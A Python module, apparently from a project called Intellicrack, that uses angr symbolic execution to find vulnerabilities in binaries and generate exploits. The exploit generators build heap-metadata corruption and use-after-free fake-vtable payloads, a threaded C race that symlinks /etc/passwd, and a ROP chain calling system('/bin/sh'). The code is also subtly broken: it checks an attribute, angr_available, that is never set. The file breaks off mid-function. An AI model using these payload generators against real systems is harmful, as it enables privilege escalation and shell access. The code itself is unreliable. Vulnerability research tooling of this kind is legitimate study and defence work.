"""Symbolic execution engine for dynamic path analysis and constraint solving."""

import logging
import os
import struct
import time
import traceback
from typing import Any

from intellicrack.logger import logger

"""
Symbolic Execution Engine for Automatic Vulnerability Discovery

Copyright (C) 2025 Zachary Flint

This file is part of Intellicrack.

Intellicrack is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

Intellicrack is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with Intellicrack.  If not, see https://www.gnu.org/licenses/.
"""


# Optional dependencies - graceful fallback if not available
try:
    import angr
    import claripy

    ANGR_AVAILABLE = True
except ImportError as e:
    logger.error("Import error in symbolic_executor: %s", e)
    ANGR_AVAILABLE = False


class SymbolicExecutionEngine:
    """Advanced symbolic execution engine for automatic vulnerability discovery.

    This engine uses symbolic execution techniques to explore program paths
    and automatically discover vulnerabilities by reasoning about program states
    and identifying conditions that could lead to security issues.
    """

    def __init__(
        self, binary_path: str, max_paths: int = 100, timeout: int = 300, memory_limit: int = 4096
    ):
        """Initialize the symbolic execution engine with path exploration and memory configuration."""
        self.binary_path = binary_path
        self.max_paths = max_paths
        self.timeout = timeout
        self.memory_limit = memory_limit * 1024 * 1024  # Convert MB to bytes
        self.logger = logging.getLogger("IntellicrackLogger.SymbolicExecution")

        # Execution state
        self.states = []
        self.completed_paths = []
        self.crashed_states = []
        self.timed_out_states = []

        # Analysis results
        self.coverage_data = {}
        self.discovered_vulnerabilities = []
        self.path_constraints = []

        # Check binary file
        if not os.path.exists(binary_path):
            raise FileNotFoundError(f"Binary file not found: {binary_path}")

        self.logger.info(
            f"Symbolic execution engine initialized for {binary_path} with {max_paths} max paths"
        )

    def _setup_symbolic_execution_project(self, vulnerability_types: list[str]) -> tuple[Any, Any, Any]:
        """Setup angr project and initial state for symbolic execution."""
        project = angr.Project(self.binary_path, auto_load_libs=False)

        # Create symbolic arguments
        symbolic_args = []
        if "buffer_overflow" in vulnerability_types or "format_string" in vulnerability_types:
            symbolic_args.append(claripy.BVS("arg1", 8 * 100))  # 100-byte symbolic buffer

        # Create initial state with symbolic arguments and enhanced options
        initial_state = project.factory.entry_state(
            args=[project.filename] + symbolic_args,
            add_options={
                angr.options.ZERO_FILL_UNCONSTRAINED_MEMORY,
                angr.options.ZERO_FILL_UNCONSTRAINED_REGISTERS,
                angr.options.SYMBOL_FILL_UNCONSTRAINED_MEMORY,
                angr.options.SYMBOL_FILL_UNCONSTRAINED_REGISTERS,
                angr.options.TRACK_MEMORY_ACTIONS,
                angr.options.TRACK_REGISTER_ACTIONS,
                angr.options.TRACK_JMP_ACTIONS,
                angr.options.TRACK_CONSTRAINT_ACTIONS,
            },
        )

        # Set up memory tracking for use-after-free detection
        if "use_after_free" in vulnerability_types:
            self._setup_heap_tracking(initial_state)

        # Set up taint tracking for data flow analysis
        if any(
            v in vulnerability_types
            for v in ["command_injection", "sql_injection", "path_traversal"]
        ):
            self._setup_taint_tracking(initial_state)

        return project, initial_state, symbolic_args

    def _configure_exploration_techniques(self, simgr: Any, vulnerability_types: list[str]) -> None:
        """Configure advanced exploration techniques for symbolic execution."""
        # Add advanced exploration techniques
        if "buffer_overflow" in vulnerability_types:
            simgr.use_technique(angr.exploration_techniques.Spiller())
            simgr.use_technique(
                angr.exploration_techniques.LengthLimiter(max_length=self.max_paths)
            )
            if hasattr(angr.exploration_techniques, "MemoryLimiter"):
                simgr.use_technique(
                    angr.exploration_techniques.MemoryLimiter(self.memory_limit)
                )
            else:
                self.logger.warning("MemoryLimiter not available in this angr version")

        # Add veritesting for path explosion mitigation
        if hasattr(angr.exploration_techniques, "Veritesting"):
            simgr.use_technique(angr.exploration_techniques.Veritesting())

        # Add loop seer for infinite loop detection
        if hasattr(angr.exploration_techniques, "LoopSeer"):
            simgr.use_technique(angr.exploration_techniques.LoopSeer(bound=10))

    def _explore_program_paths(self, simgr: Any, project: Any) -> None:
        """Explore program paths with custom find/avoid conditions."""
        self.logger.info("Exploring program paths with enhanced techniques...")

        # Define vulnerability-specific exploration targets
        find_addrs = []
        avoid_addrs = []

        # Add addresses of dangerous functions as exploration targets
        dangerous_funcs = ["strcpy", "strcat", "gets", "sprintf", "system", "exec"]
        for func_name in dangerous_funcs:
            if func_name in project.kb.functions:
                func = project.kb.functions[func_name]
                find_addrs.append(func.addr)

        simgr.explore(
            find=find_addrs if find_addrs else None,
            avoid=avoid_addrs if avoid_addrs else None,
            timeout=self.timeout,
        )

    def _analyze_integer_overflows(self, simgr: Any, vulnerabilities: list[dict[str, Any]]) -> None:
        """Analyze states for integer overflow vulnerabilities."""
        for _state in simgr.deadended + simgr.active:
            # Look for arithmetic operations with insufficient bounds checking
            for _constraint in _state.solver.constraints:
                if "mul" in str(_constraint) or "add" in str(_constraint):
                    if self._check_integer_overflow(_state, _constraint):
                        vuln = {
                            "type": "integer_overflow",
                            "address": hex(_state.addr),
                            "description": "Potential integer overflow detected",
                            "constraint": str(_constraint),
                            "severity": "high",
                        }
                        vulnerabilities.append(vuln)

    def _analyze_format_string_vulns(self, simgr: Any, project: Any, vulnerabilities: list[dict[str, Any]]) -> None:
        """Analyze states for format string vulnerabilities."""
        for _state in simgr.active + simgr.deadended:
            if self._check_format_string(_state, project):
                vuln = {
                    "type": "format_string",
                    "address": hex(_state.addr),
                    "description": "Potential format string vulnerability detected",
                    "input": _state.posix.dumps(0) if hasattr(_state, "posix") else None,
                    "severity": "high",
                }
                vulnerabilities.append(vuln)

    def _analyze_memory_vulns(self, simgr: Any, vulnerability_types: list[str], vulnerabilities: list[dict[str, Any]]) -> None:
        """Analyze states for use-after-free and double-free vulnerabilities."""
        # Check for use-after-free vulnerabilities
        if "use_after_free" in vulnerability_types:
            for _state in simgr.active + simgr.deadended + simgr.errored:
                if hasattr(_state, "heap") and hasattr(_state.heap, "_freed_chunks"):
                    # Check for accesses to freed memory
                    for action in _state.history.actions:
                        if action.type == "mem" and action.action == "read":
                            addr = _state.solver.eval(action.addr)
                            if addr in _state.heap._freed_chunks:
                                vuln = {
                                    "type": "use_after_free",
                                    "address": hex(_state.addr),
                                    "description": f"Use-after-free detected: accessing freed memory at {hex(addr)}",
                                    "freed_at": hex(
                                        _state.heap._freed_chunks[addr]["freed_at"]
                                    ),
                                    "severity": "critical",
                                }
                                vulnerabilities.append(vuln)

        # Check for double-free vulnerabilities
        if "double_free" in vulnerability_types:
            for _state in simgr.active + simgr.deadended:
                if hasattr(_state, "heap") and hasattr(_state.heap, "_freed_chunks"):
                    # Check if any pointer was freed twice
                    freed_ptrs = {}
                    for ptr, info in _state.heap._freed_chunks.items():
                        if ptr in freed_ptrs:
                            vuln = {
                                "type": "double_free",
                                "address": hex(info["freed_at"]),
                                "description": f"Double-free detected for pointer {hex(ptr)}",
                                "first_free": hex(freed_ptrs[ptr]),
                                "second_free": hex(info["freed_at"]),
                                "severity": "critical",
                            }
                            vulnerabilities.append(vuln)
                        freed_ptrs[ptr] = info["freed_at"]

    def _analyze_injection_and_race_vulns(self, simgr: Any, project: Any, initial_state: Any, vulnerability_types: list[str], vulnerabilities: list[dict[str, Any]]) -> None:
        """Analyze states for race conditions and command injection vulnerabilities."""
        # Check for race conditions
        if "race_condition" in vulnerability_types:
            for _state in simgr.active + simgr.deadended:
                if self._check_race_condition(_state, project):
                    vuln = {
                        "type": "race_condition",
                        "address": hex(_state.addr),
                        "description": "Potential race condition: multi-threading without proper synchronization",
                        "severity": "high",
                    }
                    vulnerabilities.append(vuln)

        # Check for command injection via taint analysis
        if (
            "command_injection" in vulnerability_types
            and hasattr(initial_state, "plugins")
            and "taint" in initial_state.plugins
        ):
            for _state in simgr.active + simgr.deadended:
                # Check if tainted data reaches system/exec calls
                for func_name in ["system", "exec", "execve", "popen"]:
                    if func_name in project.kb.functions:
                        func = project.kb.functions[func_name]
                        if _state.addr == func.addr:
                            # Check if arguments are tainted
                            arg_reg = "rdi" if _state.arch.bits == 64 else "eax"
                            if hasattr(_state.regs, arg_reg):
                                arg_val = getattr(_state.regs, arg_reg)
                                if _state.plugins.taint.is_tainted(arg_val):
                                    vuln = {
                                        "type": "command_injection",
                                        "address": hex(_state.addr),
                                        "description": f"Command injection: tainted data reaches {func_name}",
                                        "taint_source": _state.plugins.taint.get_taint_source(
                                            arg_val
                                        ),
                                        "severity": "critical",
                                    }
                                    vulnerabilities.append(vuln)

    def _analyze_type_confusion_vulns(self, simgr: Any, project: Any, vulnerability_types: list[str], vulnerabilities: list[dict[str, Any]]) -> None:
        """Analyze states for type confusion vulnerabilities."""
        if "type_confusion" in vulnerability_types:
            for _state in simgr.active + simgr.deadended:
                if self._check_type_confusion(_state, project):
                    vuln = {
                        "type": "type_confusion",
                        "address": hex(_state.addr),
                        "description": "Potential type confusion vulnerability in C++ virtual function handling",
                        "severity": "high",
                    }
                    vulnerabilities.append(vuln)

    def discover_vulnerabilities(
        self, vulnerability_types: list[str] | None = None
    ) -> list[dict[str, Any]]:
        """Perform symbolic execution to discover vulnerabilities.

        Args:
            vulnerability_types: List of vulnerability types to look for, or None for all

        Returns:
            list: Discovered vulnerabilities with details

        """
        if not self.angr_available:
            # Comprehensive fallback implementation without angr dependency
            return self._native_vulnerability_discovery(vulnerability_types)

        if vulnerability_types is None:
            vulnerability_types = [
                "buffer_overflow",
                "integer_overflow",
                "use_after_free",
                "format_string",
                "command_injection",
                "path_traversal",
                "double_free",
                "null_pointer_deref",
                "race_condition",
                "type_confusion",
                "heap_overflow",
                "stack_overflow",
            ]

        self.logger.info("Starting symbolic execution on %s", self.binary_path)
        self.logger.info("Looking for vulnerability types: %s", vulnerability_types)

        try:
            # Setup project and initial state
            project, initial_state, symbolic_args = self._setup_symbolic_execution_project(vulnerability_types)

            # Set up exploration technique
            simgr = project.factory.simulation_manager(initial_state)

            # Configure exploration techniques
            self._configure_exploration_techniques(simgr, vulnerability_types)

            # Explore program paths
            self._explore_program_paths(simgr, project)

            # Analyze results with enhanced vulnerability detection
            vulnerabilities = []

            # Use enhanced vulnerability analysis
            enhanced_vulns = self._analyze_vulnerable_paths(simgr, vulnerability_types, project)
            vulnerabilities.extend(enhanced_vulns)

            # Check for different vulnerability types
            if "integer_overflow" in vulnerability_types:
                self._analyze_integer_overflows(simgr, vulnerabilities)

            if "format_string" in vulnerability_types:
                self._analyze_format_string_vulns(simgr, project, vulnerabilities)

            if "use_after_free" in vulnerability_types or "double_free" in vulnerability_types:
                self._analyze_memory_vulns(simgr, vulnerability_types, vulnerabilities)

            if "race_condition" in vulnerability_types or "command_injection" in vulnerability_types:
                self._analyze_injection_and_race_vulns(simgr, project, initial_state, vulnerability_types, vulnerabilities)

            if "type_confusion" in vulnerability_types:
                self._analyze_type_confusion_vulns(simgr, project, vulnerability_types, vulnerabilities)

            self.logger.info(
                "Symbolic execution completed. Found %d potential vulnerabilities.",
                len(vulnerabilities),
            )
            return vulnerabilities

        except (OSError, ValueError, RuntimeError) as e:
            self.logger.error("Error during symbolic execution: %s", e)
            self.logger.error(traceback.format_exc())
            return [{"error": f"Symbolic execution failed: {e!s}"}]

    def _check_integer_overflow(self, state, constraint) -> bool:
        """Check if a constraint could lead to an integer overflow.

        Args:
            state: Program state
            constraint: Constraint to check

        Returns:
            bool: True if potential integer overflow, False otherwise

        """
        try:
            # Check if constraint involves arithmetic that could overflow
            constraint_str = str(constraint)
            self.logger.debug(
                "Checking for integer overflow in constraint: %s at 0x%d",
                constraint_str,
                state.addr,
            )
            if "+" in constraint_str or "*" in constraint_str:
                # Try to find cases where large values are possible
                if state.solver.satisfiable(extra_constraints=[constraint]):
                    # Check if we can satisfy with very large values
                    for _var in state.solver.variables:
                        try:
                            max_val = state.solver.max(_var)
                            if max_val > 2**30:  # Large value threshold
                                self.logger.info(
                                    "Potential integer overflow identified due to large variable value for '%s'",
                                    _var,
                                )
                                return True
                        except (AttributeError, ValueError, RuntimeError) as e:
                            self.logger.debug("Failed to analyze variable for overflow: %s", e)
            return False
        except (OSError, ValueError, RuntimeError) as e:
            self.logger.warning("Error during integer overflow check: %s", e, exc_info=False)
            return False

    def _check_format_string(self, state, project) -> bool:
        """Check if state could contain a format string vulnerability.

        Args:
            state: Program state
            project: Angr project

        Returns:
            bool: True if potential format string vulnerability, False otherwise

        """
        try:
            # Look for printf-like function calls with user-controlled format string
            self.logger.debug("Checking for format string vulnerability at 0x%d", state.addr)
            for _addr in state.history.bbl_addrs:
                try:
                    function = project.kb.functions.get_by_addr(_addr)
                    if function and function.name:
                        self.logger.debug("Found call to %s at 0x%d", function.name, _addr)
                        if (
                            "printf" in function.name
                            or "sprintf" in function.name
                            or "fprintf" in function.name
                        ):
                            # Check if first argument (format string) is symbolic
                            for _var in state.solver.variables:
                                var_name = str(_var)
                                if "arg" in var_name and "%" in state.solver.eval(
                                    _var, cast_to=bytes
                                ).decode("latin-1", errors="ignore"):
                                    self.logger.info(
                                        "Potential format string vulnerability: Symbolic format string for %s controlled by '%s'",
                                        function.name,
                                        var_name,
                                    )
                                    return True
                except (OSError, ValueError, RuntimeError) as e:
                    logger.error("Error in symbolic_executor: %s", e)
                    continue
            return False
        except (OSError, ValueError, RuntimeError) as e:
            self.logger.warning("Error during format string check: %s", e, exc_info=False)
            return False

    def generate_exploit(self, vulnerability: dict[str, Any]) -> dict[str, Any]:
        """Generate a proof-of-concept exploit for a discovered vulnerability.

        Args:
            vulnerability: Vulnerability information from discover_vulnerabilities

        Returns:
            dict: Exploit information including payload and instructions

        """
        if not self.angr_available:
            return {"error": "Required dependencies not available"}

        try:
            vuln_type = vulnerability.get("type")

            if vuln_type == "buffer_overflow":
                # Generate buffer overflow exploit
                payload = b"A" * 256  # Basic overflow pattern
                if vulnerability.get("input"):
                    # Use the input that triggered the vulnerability
                    payload = vulnerability["input"]

                return {
                    "type": "buffer_overflow",
                    "payload": payload.hex(),
                    "instructions": "Send this payload to the program input to trigger the buffer overflow",
                }

            if vuln_type == "format_string":
                # Generate format string exploit
                payload = b"%x " * 20  # Basic format string leak

                return {
                    "type": "format_string",
                    "payload": payload.hex(),
                    "instructions": "Send this payload to leak memory through format string vulnerability",
                }

            if vuln_type == "integer_overflow":
                # Generate integer overflow exploit
                return {
                    "type": "integer_overflow",
                    "payload": "0x7FFFFFFF",
                    "instructions": "Use this value to trigger integer overflow",
                }

            if vuln_type == "heap_overflow":
                return self._generate_heap_exploit(vulnerability)

            if vuln_type == "use_after_free":
                return self._generate_uaf_exploit(vulnerability)

            if vuln_type == "race_condition":
                return self._generate_race_condition_exploit(vulnerability)

            if vuln_type == "type_confusion":
                return self._generate_type_confusion_exploit(vulnerability)

            return {"error": f"Unknown vulnerability type: {vuln_type}"}

        except (OSError, ValueError, RuntimeError) as e:
            self.logger.error("Error generating exploit: %s", e)
            return {"error": f"Exploit generation failed: {e!s}"}

    def _generate_heap_exploit(self, vulnerability: dict[str, Any]) -> dict[str, Any]:
        """Generate heap overflow exploit with real heap manipulation techniques."""
        import struct

        heap_info = vulnerability.get("heap_info", {})
        chunk_size = heap_info.get("chunk_size", 0x100)
        target_addr = heap_info.get("target_addr", 0)

        # Generate heap feng shui payload
        payload = bytearray()

        # Heap grooming: allocate predictable chunks
        for _i in range(16):
            # Allocation pattern to create predictable heap layout
            payload += struct.pack("<I", 0x21)  # Chunk size (32 bytes + flags)
            payload += b"A" * 24  # Chunk data
            payload += struct.pack("<I", 0x21)  # Next chunk size

        # Overflow payload
        overflow_size = vulnerability.get("overflow_size", 256)
        payload += b"B" * (overflow_size - 8)  # Fill to overflow point

        # Heap metadata corruption
        # Overwrite next chunk's size and fd/bk pointers for unlink attack
        fake_chunk = struct.pack("<I", 0x41)  # Size with PREV_INUSE bit
        fake_chunk += struct.pack("<Q", target_addr - 0x18)  # fd pointer
        fake_chunk += struct.pack("<Q", target_addr - 0x10)  # bk pointer
        payload += fake_chunk

        # House of Force specific payload if detected
        if heap_info.get("technique") == "house_of_force":
            # Corrupt top chunk size
            payload += b"\xff" * 8  # Set top chunk size to -1

        # House of Einherjar payload
        elif heap_info.get("technique") == "house_of_einherjar":
            # Create fake chunk for consolidation
            payload += struct.pack("<Q", 0x0)  # prev_size
            payload += struct.pack("<Q", 0x101)  # size with PREV_INUSE clear

        return {
            "type": "heap_overflow",
            "payload": payload.hex(),
            "technique": heap_info.get("technique", "unlink"),
            "instructions": f"Heap exploit using {heap_info.get('technique', 'unlink')} technique. "
            f"Payload creates predictable heap layout and corrupts metadata.",
            "heap_layout": {
                "spray_count": 16,
                "chunk_size": chunk_size,
                "overflow_offset": overflow_size,
                "target_address": hex(target_addr) if target_addr else "calculated at runtime",
            },
        }

    def _generate_uaf_exploit(self, vulnerability: dict[str, Any]) -> dict[str, Any]:
        """Generate use-after-free exploit with object lifecycle manipulation."""
        import struct

        uaf_info = vulnerability.get("uaf_info", {})
        object_size = uaf_info.get("object_size", 0x40)
        vtable_offset = uaf_info.get("vtable_offset", 0)

        # Generate UAF trigger sequence
        exploit_sequence = []

        # Step 1: Allocation spray to prepare heap
        spray_payload = bytearray()
        for i in range(32):
            spray_payload += struct.pack("<Q", 0x4141414141410000 + i)

        exploit_sequence.append(
            {
                "action": "spray",
                "data": spray_payload.hex(),
                "count": 32,
                "size": object_size,
            }
        )

        # Step 2: Trigger free of target object
        exploit_sequence.append(
            {
                "action": "free",
                "target": uaf_info.get("target_id", 0),
            }
        )

        # Step 3: Reallocate with controlled data
        # Create fake object with controlled vtable
        fake_object = bytearray()

        if vtable_offset:
            # Craft fake vtable
            fake_vtable_addr = 0x7FFF00000000  # Predictable address
            fake_object += b"A" * vtable_offset
            fake_object += struct.pack("<Q", fake_vtable_addr)

            # Add fake vtable entries (function pointers)
            fake_vtable = bytearray()
            for i in range(10):
                # Point to shellcode or ROP gadgets
                fake_vtable += struct.pack("<Q", 0x400000 + (i * 0x1000))

            exploit_sequence.append(
                {
                    "action": "map_memory",
                    "address": fake_vtable_addr,
                    "data": fake_vtable.hex(),
                }
            )
        else:
            # Direct function pointer overwrite
            target_func = uaf_info.get("target_function", 0x400000)
            fake_object += struct.pack("<Q", target_func) * (object_size // 8)

        exploit_sequence.append(
            {
                "action": "allocate",
                "size": object_size,
                "data": fake_object.hex(),
            }
        )

        # Step 4: Trigger use of freed object
        exploit_sequence.append(
            {
                "action": "trigger_use",
                "method": uaf_info.get("trigger_method", "virtual_call"),
            }
        )

        return {
            "type": "use_after_free",
            "exploit_sequence": exploit_sequence,
            "payload": fake_object.hex(),
            "instructions": "UAF exploit sequence: spray heap, free target, reallocate with "
            "controlled data, trigger reuse",
            "object_info": {
                "size": object_size,
                "vtable_offset": vtable_offset,
                "trigger_method": uaf_info.get("trigger_method", "virtual_call"),
            },
        }

    def _generate_race_condition_exploit(self, vulnerability: dict[str, Any]) -> dict[str, Any]:
        """Generate race condition exploit with timing attack capabilities."""
        import struct

        race_info = vulnerability.get("race_info", {})
        window_size = race_info.get("window_size", 1000)  # microseconds

        # Generate multi-threaded race condition trigger
        race_exploit = {
            "threads": [],
            "synchronization": "barrier",
            "iterations": 10000,
            "timing_window": window_size,
        }

        # Thread 1: Perform the first operation
        thread1_code = """
#include <pthread.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <unistd.h>

void *race_thread1(void *arg) {
    volatile int *flag = (int *)arg;
    int fd;

    while (*flag == 0) {
        // Tight loop waiting for sync
        __asm__ __volatile__("pause");
    }

    // Race window operation 1
    fd = open("/target/file", O_RDWR);
    if (fd >= 0) {
        // Perform privileged operation
        write(fd, "AAAA", 4);
        close(fd);
    }

    return NULL;
}
"""

        # Thread 2: Perform the conflicting operation
        thread2_code = """
void *race_thread2(void *arg) {
    volatile int *flag = (int *)arg;

    while (*flag == 0) {
        __asm__ __volatile__("pause");
    }

    // Race window operation 2
    // Attempt to change permissions/state
    chmod("/target/file", 0666);
    symlink("/etc/passwd", "/target/file");

    return NULL;
}
"""

        # Main exploit code
        main_code = f"""
int main() {{
    pthread_t t1, t2;
    volatile int sync_flag = 0;
    int success = 0;

    for (int i = 0; i < {race_exploit['iterations']}; i++) {{
        sync_flag = 0;

        pthread_create(&t1, NULL, race_thread1, (void *)&sync_flag);
        pthread_create(&t2, NULL, race_thread2, (void *)&sync_flag);

        // Synchronize thread start
        usleep(10);
        sync_flag = 1;

        pthread_join(t1, NULL);
        pthread_join(t2, NULL);

        // Check if race was won
        if (access("/target/file", W_OK) == 0) {{
            success = 1;
            break;
        }}
    }}

    return success ? 0 : 1;
}}
"""

        race_exploit["threads"] = [
            {"id": 1, "code": thread1_code, "operation": "write"},
            {"id": 2, "code": thread2_code, "operation": "symlink"},
        ]

        race_exploit["main_code"] = main_code

        # Generate timing adjustment payload
        timing_payload = struct.pack("<I", window_size)
        timing_payload += struct.pack("<I", race_exploit["iterations"])

        return {
            "type": "race_condition",
            "exploit": race_exploit,
            "payload": timing_payload.hex(),
            "instructions": f"Race condition exploit targeting {window_size}μs window. "
            f"Runs {race_exploit['iterations']} iterations with synchronized threads.",
            "timing_info": {
                "window_size_us": window_size,
                "iterations": race_exploit["iterations"],
                "synchronization": "pthread_barrier",
                "success_indicator": "file_permission_change",
            },
        }

    def _generate_type_confusion_exploit(self, vulnerability: dict[str, Any]) -> dict[str, Any]:
        """Generate type confusion exploit with object type manipulation."""
        import struct

        confusion_info = vulnerability.get("confusion_info", {})
        source_type = confusion_info.get("source_type", "TypeA")
        target_type = confusion_info.get("target_type", "TypeB")

        # Generate type confusion payload
        exploit_data = {
            "setup": [],
            "trigger": {},
            "payload": bytearray(),
        }

        # Setup phase: Create objects of both types
        # Source object (smaller)
        source_size = confusion_info.get("source_size", 0x20)
        source_layout = bytearray()
        source_layout += struct.pack("<Q", 0x1337)  # Type identifier
        source_layout += b"A" * (source_size - 8)

        exploit_data["setup"].append(
            {
                "action": "allocate_object",
                "type": source_type,
                "size": source_size,
                "data": source_layout.hex(),
            }
        )

        # Target object (larger, allows overflow)
        target_size = confusion_info.get("target_size", 0x100)
        target_layout = bytearray()
        target_layout += struct.pack("<Q", 0x7331)  # Different type ID

        # Craft vtable for type confusion
        fake_vtable = 0x555555554000
        target_layout += struct.pack("<Q", fake_vtable)  # vtable pointer

        # Add fields that will be interpreted differently
        for i in range(8):
            # These will be interpreted as different types
            target_layout += struct.pack("<Q", 0x41414141 + (i << 32))

        # Add ROP chain or shellcode
        rop_chain = [
            0x400123,  # pop rdi; ret
            0x68732F6E69622F,  # "/bin/sh"
            0x4005D0,  # system@plt
        ]

        for gadget in rop_chain:
            target_layout += struct.pack("<Q", gadget)

        exploit_data["setup"].append(
            {
                "action": "allocate_object",
                "type": target_type,
                "size": target_size,
                "data": target_layout.hex(),
            }
        )

        # Trigger phase: Cause type confusion
        exploit_data["trigger"] = {
            "method": confusion_info.get("trigger_method", "cast"),
            "operation": "reinterpret_cast",
            "source_ref": 0,  # Reference to source object
            "target_ref": 1,  # Reference to target object
            "invoke": "virtual_function_7",  # Call confused vtable entry
        }

        # Combined payload for direct injection
        exploit_data["payload"] = source_layout + target_layout

        return {
            "type": "type_confusion",
            "exploit_data": exploit_data,
            "payload": exploit_data["payload"].hex(),
            "instructions": f"Type confusion between {source_type} ({source_size} bytes) and "
            f"{target_type} ({target_size} bytes). Trigger through type cast "
            "and virtual function call.",
            "confusion_details": {
                "source_type": source_type,
                "target_type": target_type,
                "size_difference": target_size - source_size,
                "trigger_method": confusion_info.get("trigger_method", "cast"),
                "exploitable_offset": confusion_info.get("exploitable_offset", 8),
            },
        }

    def _check_memory_violations(self, state) -> bool:
        """Check for memory violations in the current state."""
        if not hasattr(state, "memory"):
            return False

        try:
            # Look for writes to invalid memory regions
            if hasattr(state.memory.mem, "get_memory_backer"):
                memory_plugins = state.memory.mem.get_memory_backer()
            else:
                memory_plugins = getattr(state.memory.mem, "_memory_backer", None)

            if memory_plugins and hasattr(memory_plugins, "get_memory_objects_by_region"):
                memory_objects_by_region = memory_plugins.get_memory_objects_by_region()
            elif memory_plugins:
                memory_objects_by_region = getattr(
                    memory_plugins, "_memory_objects_by_region", []
                )
            else:
                memory_objects_by_region = []

            if memory_objects_by_region:
                # Check if we're writing outside allocated regions
                for region in memory_objects_by_region:
                    if hasattr(region, "violations") and region.violations:
                        self.logger.info("Memory violation detected at 0x%x", state.addr)
                        return True
        except (AttributeError, TypeError) as e:
            self.logger.debug("Failed to analyze memory for violations: %s", e)

        return False

    def _check_stack_buffer_overflow(self, state) -> bool:
        """Check for stack buffer overflows by examining stack pointer manipulation."""
        if not hasattr(state, "regs"):
            return False

        try:
            # Get current stack pointer
            sp_name = "rsp" if state.arch.bits == 64 else "esp"
            if hasattr(state.regs, sp_name):
                current_sp = getattr(state.regs, sp_name)

                # Check if stack pointer is symbolic and unconstrained
                if current_sp.symbolic and len(current_sp.variables) > 0:
                    # Check if we can make SP point to arbitrary locations
                    try:
                        min_sp = state.solver.min(current_sp)
                        max_sp = state.solver.max(current_sp)

                        # If SP can vary widely, it might indicate stack corruption
                        if max_sp - min_sp > 0x10000:  # 64KB range
                            self.logger.info(
                                "Potential stack buffer overflow: SP can vary by %d bytes",
                                max_sp - min_sp,
                            )
                            return True
                    except (RuntimeError, ValueError) as e:
                        self.logger.debug(
                            "Failed to analyze stack pointer variation: %s", e
                        )

        except (AttributeError, TypeError) as e:
            self.logger.debug("Failed to analyze stack buffer overflow: %s", e)

        return False

    def _check_dangerous_function_calls(self, state, project) -> bool:
        """Check for function calls to dangerous functions with symbolic arguments."""
        if not (hasattr(state, "history") and hasattr(state.history, "bbl_addrs")):
            return False

        try:
            for addr in state.history.bbl_addrs[-5:]:  # Check last 5 basic blocks
                try:
                    block = project.factory.block(addr)
                    for insn in block.capstone.insns:
                        # Look for calls to dangerous functions
                        if insn.mnemonic == "call":
                            try:
                                target = insn.operands[0].value.imm
                                if target in project.kb.functions:
                                    func = project.kb.functions[target]
                                    if func.name and any(
                                        dangerous in func.name.lower()
                                        for dangerous in [
                                            "strcpy",
                                            "strcat",
                                            "gets",
                                            "sprintf",
                                            "scanf",
                                        ]
                                    ):
                                        # Check if arguments are symbolic
                                        for reg in (
                                            ["rdi", "rsi", "rdx"]
                                            if state.arch.bits == 64
                                            else ["eax", "ebx", "ecx"]
                                        ):
                                            if hasattr(state.regs, reg):
                                                arg = getattr(state.regs, reg)
                                                if arg.symbolic:
                                                    self.logger.info(
                                                        "Dangerous function %s called with symbolic argument",
                                                        func.name,
                                                    )
                                                    return True
                            except (AttributeError, IndexError, KeyError) as e:
                                logger.error("Error in symbolic_executor: %s", e)
                                continue
                except (RuntimeError, ValueError) as e:
                    logger.error("Error in symbolic_executor: %s", e)
                    continue
        except (AttributeError, TypeError) as e:
            self.logger.debug("Failed to analyze dangerous function calls: %s", e)

        return False

    def _check_heap_buffer_overflow(self, state) -> bool:
        """Check for heap buffer overflows by examining malloc/free patterns."""
        if not hasattr(state, "heap"):
            return False

        try:
            # Look for heap metadata corruption indicators
            heap_chunks = getattr(state.heap, "_chunks", {})
            for chunk_info in heap_chunks.values():
                if hasattr(chunk_info, "size") and hasattr(chunk_info, "data"):
                    # Check if chunk size is symbolic and can be made very large
                    if chunk_info.size.symbolic:
                        try:
                            max_size = state.solver.max(chunk_info.size)
                            if max_size > 0x100000:  # 1MB threshold
                                self.logger.info(
                                    "Potential heap overflow: chunk size can be %d bytes",
                                    max_size,
                                )
                                return True
                        except (RuntimeError, ValueError) as e:
                            self.logger.debug("Failed to analyze heap operation: %s", e)
        except (AttributeError, TypeError) as e:
            self.logger.debug("Failed to analyze heap buffer overflow: %s", e)

        return False

    def _check_buffer_overflow(self, state, project) -> bool:
        """Check if state could contain a buffer overflow vulnerability.

        Args:
            state: Program state
            project: Angr project

        Returns:
            bool: True if potential buffer overflow vulnerability, False otherwise

        """
        try:
            self.logger.debug("Checking for buffer overflow at 0x%x", state.addr)

            # Check for memory violations
            if self._check_memory_violations(state):
                return True

            # Check for stack buffer overflows by examining stack pointer manipulation
            if self._check_stack_buffer_overflow(state):
                return True

            # Check for function calls to dangerous functions with symbolic arguments
            if self._check_dangerous_function_calls(state, project):
                return True

            # Check for heap buffer overflows by examining malloc/free patterns
            if self._check_heap_buffer_overflow(state):
                return True

            return False

        except (OSError, ValueError, RuntimeError) as e:
            self.logger.warning("Error during buffer overflow check: %s", e, exc_info=False)
            return False

    def _analyze_vulnerable_paths(
        self, simgr, vulnerability_types: list[str], project
    ) -> list[dict[str, Any]]:
        """Analyze simulation manager paths for vulnerabilities with enhanced detection.

        Args:
            simgr: Simulation manager
            vulnerability_types: Types of vulnerabilities to look for
            project: Angr project

        Returns:
            list: Detected vulnerabilities with enhanced information

        """
        vulnerabilities = []

        try:
            # Get binary information from project
            binary_name = (
                project.loader.main_object.binary
                if project and project.loader.main_object
                else "unknown"
            )

            # Enhanced buffer overflow detection
            if "buffer_overflow" in vulnerability_types:
                # Check errored states for segfaults
                for state in simgr.errored:
                    if isinstance(state.error, angr.errors.SimSegfaultError):
                        vuln = {
                            "type": "buffer_overflow",
                            "address": hex(state.addr),
                            "description": "Segmentation fault detected",
                            "input": state.posix.dumps(0) if hasattr(state, "posix") else None,
                            "error_type": "segfault",
                            "severity": "high",
                            "binary": binary_name,
                        }
                        vulnerabilities.append(vuln)

                # Check active and deadended states for potential overflows
                for state in simgr.active + simgr.deadended:
                    if self._check_buffer_overflow(
                        state, getattr(simgr, "project", None) or getattr(simgr, "_project", None)
                    ):
                        vuln = {
                            "type": "buffer_overflow",
                            "address": hex(state.addr),
                            "description": "Potential buffer overflow condition detected",
                            "input": state.posix.dumps(0) if hasattr(state, "posix") else None,
